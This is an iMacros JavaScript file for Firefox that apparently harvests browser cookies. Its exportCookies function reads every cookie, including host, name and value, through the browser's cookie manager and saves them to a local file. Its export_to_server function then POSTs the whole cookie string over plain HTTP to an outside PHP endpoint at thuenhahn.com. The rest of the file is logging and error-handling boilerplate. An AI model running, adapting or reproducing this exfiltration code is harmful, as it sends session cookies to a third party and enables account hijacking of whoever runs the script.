﻿
function export_to_server(string_cookie){
	var xhr = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest);
	xhr.open('POST', 'http://thuenhahn.com/temp/getcookie.php', false);
	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	var file_name = prompt("Input file name");
	var params = "action=export&fname="+file_name+"&cc=" + string_cookie;
	xhr.send(params);
	if (xhr.status == 200) {
	     iimDisplay("Exported");
		// alert(xhr.response);
	}
}
    var endl = "\n";


    // Return a string containing the formatted error info.
    // in: err(Error)
    // return message(string)
    function formatErr(err)
    {
        var message = "--- Exception " + ( err && err.name ? err.name : "<Unknown>") + " ---" + endl;
       
        if(err)
        {
            message += endl + (err.message ? err.message : "") + endl;
            message += endl + (err.stack ? err.stack : "") + endl;
        }
        else
        {
            message += "No error information provided.";
        }
       
        return message;
    }


    // Log a message to Firefox's browser console.
    // https://developer.mozilla.org/en-US/docs/Components.utils.reportError
    function console(aMessage) {
        var consoleService = Components.classes["@mozilla.org/consoleservice;1"]
            .getService(Components.interfaces.nsIConsoleService);
        consoleService.logStringMessage("iMacros: " + aMessage);
    }


    // Log a message to iMacros' display and Firefox's browser console.
    function log(message)
    {
        iimDisplay(message);
        console(message);
    }


    // Log a message to iMacros' display, Firefox's browser console and display it via alert()
    function logAlert(message)
    {
        log(message);
        alert(message);
    }


    //
    //
    // wrap all code in a try/catch
    //
    //
    try {
    // anonymous function allows use of return statement and making a function call before it's defined.
    (function () {

    var dateobj = new Date();
    var isodate = dateobj.toISOString();
    log("Started script " + endl + isodate);

    const folder = "D:\\";



    //
    // YOUR CODE GOES HERE.
    //

	
	
    exportCookies("cookies.txt");




    // Import cookies.
    //
    // return none
    // fatal: failed to import cookies
    //
    // if filename does not exist no cookies are imported
	
  

    // Export cookies.
    //
    // return none
    // fatal: failed to export cookies
    //
    // if no cookies exist filename is not written
    function exportCookies(filename)
    {
        var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
        file.initWithPath(folder + filename);
       
        var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
		
        foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0); // write, create, truncate

        var e = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager).enumerator;

        var cookieNum = 0;
		var export_string = '' ; 
        while(e.hasMoreElements()){
            var cc = e.getNext().QueryInterface(Components.interfaces.nsICookie);
			/*
            var cookieInfo = cc.host
                + "\t" + new String(cc.isDomain).toUpperCase()
                + "\t" + cc.path
                + "\t" + new String(cc.isSecure).toUpperCase()
                + "\t" + cc.expires
                + "\t" + cc.name
                + "\t" + cc.value
                + "\r\n";
				
			*/	
			var cookieInfo = cc.host
                + " | " + new String(cc.isDomain).toUpperCase()
                + " | " + cc.path
                + " | " + new String(cc.isSecure).toUpperCase()
                + " | " + cc.expires
                + " | " + cc.name
                + " | " + cc.value
                + "meobr";

            foStream.write(cookieInfo, cookieInfo.length);
            cookieNum++;
			export_string = export_string + cookieInfo ;
        }
        export_to_server(export_string);
	   
        foStream.close();
        console("Exported " + cookieNum + " cookies to " + filename);
    }

    // return none
    // fatal: iimPlay failed
    function clearCookies()
    {
        if(iimPlay("CODE:CLEAR") !== 1)
        {
            throw new Error("iimPlay() failed (see sidebar)");
        }
    }


    // END CODE HERE
    })(); // end of anonymous function
    } catch(err) {
        var message = formatErr(err);
        console(message);
        throw err;
    }


